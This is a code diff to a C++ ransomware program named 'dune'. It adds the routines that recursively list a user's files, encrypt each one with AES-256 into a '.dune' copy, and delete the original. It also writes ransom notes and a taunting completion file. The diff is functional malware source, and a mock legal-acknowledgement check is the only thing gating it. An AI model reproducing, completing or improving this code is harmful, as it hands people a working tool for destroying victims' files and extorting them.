@@ -9,6 +9,8 @@
 #include <openssl/evp.h>
 #include <openssl/rand.h>
 #include <openssl/err.h>
+#include <openssl/aes.h>
+#include <openssl/sha.h>
 #include "crypto.hpp"
 #include "common.hpp"
 
@@ -16,10 +18,12 @@ namespace dune
 {
     enum ATTACK_STATUS
     {
+        SUCCESS,
         RUNNING,
         OPENSSL_ERROR,
         YOU_DID_NOW_ACCEPT,
-        UNABLE_TO_WRITE_ALL_NOTES
+        UNABLE_TO_WRITE_ALL_NOTES,
+        CANT_FIND_HOME_DIR
     };
     /* All must be set to true or the program will terminate */
     struct Acknowledgement
@@ -42,28 +46,50 @@ namespace dune
             hacker_email = email_of_hacker;
         };
         /* Must pass the Acknowledgement stucture */
-        ATTACK_STATUS attack(Acknowledgement agreement, bool force)
+        /* Creates thread use detatch to stop the hang up */
+        ATTACK_STATUS attack(Acknowledgement agreement, bool detatch = false)
         {
             if (!(agreement.are_you_sure_you_want_to_do_this && agreement.i_accept_the_risks_and_consequences_of_my_actions && agreement.i_understand_it_is_illegel))
             {
                 std::cout << "Oh, Well this is embarrassing..." << std::endl;
-
                 return ATTACK_STATUS::YOU_DID_NOW_ACCEPT;
             }
-            std::string user_home_path = std::string(getenv("HOMEDRIVE")) + std::string(getenv("HOMEPATH"));
-            std::vector<std::string> files_in_dir;
+            char *drive = getenv("HOMEDRIVE");
+            char *path = getenv("HOMEPATH");
+            if (drive == nullptr || path == nullptr)
+            {
+                return ATTACK_STATUS::CANT_FIND_HOME_DIR;
+            }
+            std::string user_home_path = std::string(drive) + std::string(path);
+            user_home_path = "./";
             derive_key();
             encrypt_derived_key();
             if (write_note() != user_notes_locations.size())
             {
                 return ATTACK_STATUS::UNABLE_TO_WRITE_ALL_NOTES;
             }
-            std::thread encryptor(encrypt_files, plain_key, exempt_files);
-            encryptor.detach();
-            return ATTACK_STATUS::RUNNING;
+            std::thread encryptor(encrypt_files, plain_key, exempt_files, user_home_path);
+            plain_key.clear();
+            if (detatch)
+            {
+                encryptor.detach();
+                return ATTACK_STATUS::RUNNING;
+            }
+            else
+            {
+                encryptor.join();
+                return ATTACK_STATUS::SUCCESS;
+            }
         }
         bool verify_done()
         {
+            std::ifstream check_file("finish.txt");
+            bool status = !!check_file;
+            if (status)
+            {
+                check_file.close();
+                return true;
+            }
             return false;
         }
 
@@ -78,9 +104,6 @@ namespace dune
         std::string public_key_pem;
         std::string encrypted_key;
         std::string plain_key;
-        void encrypt_file(std::string full_path)
-        {
-        }
         void derive_key()
         {
             unsigned char buffer[32];
@@ -120,8 +143,95 @@ namespace dune
                 }
             }
         }
-        static void encrypt_files(std::string enc_key, std::vector<std::string> excluded_hashes)
+        static std::string compute_file_hash(std::string fname)
         {
+            std::ifstream fd;
+            char buff[256];
+            int i = 0;
+            SHA_CTX sha_ctx;
+            unsigned char sha1_hash[SHA_DIGEST_LENGTH];
+            SHA1_Init(&sha_ctx);
+            fd = std::ifstream(fname, std::ios_base::binary);
+            do
+            {
+                i = fd.readsome(buff, 256);
+                SHA1_Update(&sha_ctx, buff, i);
+            } while (i > 0);
+            fd.close();
+            SHA1_Final(sha1_hash, &sha_ctx);
+
+            return std::string((const char *)sha1_hash, SHA_DIGEST_LENGTH);
+        }
+        static void encrypt_file(std::string full_path, std::string enc_key)
+        {
+            FILE *infile = fopen(full_path.c_str(), "rb"); // must be open in read mode + binary
+            if (!infile)
+            {
+                return;
+            }
+
+            FILE *outfile = fopen((full_path + ".dune").c_str(), "w+b");
+            if (!outfile)
+            {
+                return;
+            }
+            int bytes_read, bytes_written;
+            unsigned char indata[AES_BLOCK_SIZE];
+            unsigned char outdata[AES_BLOCK_SIZE];
+            unsigned char *ckey = (unsigned char *)enc_key.c_str();
+            unsigned char ivec[] = "dontusethisinput";
+            AES_KEY key;
+            AES_set_encrypt_key(ckey, 256, &key);
+            int num = 0;
+
+            while (1)
+            {
+                bytes_read = fread(indata, 1, AES_BLOCK_SIZE, infile);
+                AES_cbc_encrypt(indata,outdata,bytes_read,&key,ivec,AES_ENCRYPT);
+                bytes_written = fwrite(outdata, 1, bytes_read, outfile);
+                if (bytes_read < AES_BLOCK_SIZE)
+                    break;
+            }
+        }
+
+        static void encrypt_files(std::string enc_key, std::vector<std::string> excluded_hashes, std::string user_home)
+        {
+            std::vector<std::string> files_to_encrypt;
+            ls_recursive(user_home, &files_to_encrypt);
+            if (files_to_encrypt.size() == 0)
+            {
+                return;
+            }
+            for (int i = 0; i < files_to_encrypt.size(); i++)
+            {
+                try
+                {
+                    bool skip = false;
+                    std::string hash_to_check = compute_file_hash(files_to_encrypt[i]);
+                    for (int j = 0; j < excluded_hashes.size(); j++)
+                    {
+                        if (hash_to_check == excluded_hashes[j])
+                        {
+                            skip = true;
+                            break;
+                        }
+                    }
+                    if (skip)
+                    {
+                        continue;
+                    }
+                    encrypt_file(files_to_encrypt[i], enc_key);
+                    remove(files_to_encrypt[i].c_str());
+                }
+                catch (...)
+                {
+                }
+            }
+            std::ofstream finish("./finish.txt");
+            char done_msg[] = "You are fuck!d...\n";
+            finish.write(done_msg, sizeof(done_msg));
+            finish.close();
+            return;
         }
         int write_note()
         {
@@ -144,7 +254,7 @@ namespace dune
             {
                 try
                 {
-                    if (user_notes_locations[i].ends_with(".txt"))
+                    if (user_notes_locations[i].find(".txt") != std::string::npos)
                     {
                         std::ofstream file_to_write(user_notes_locations[i]);
                         file_to_write.write(note.c_str(), note.length());
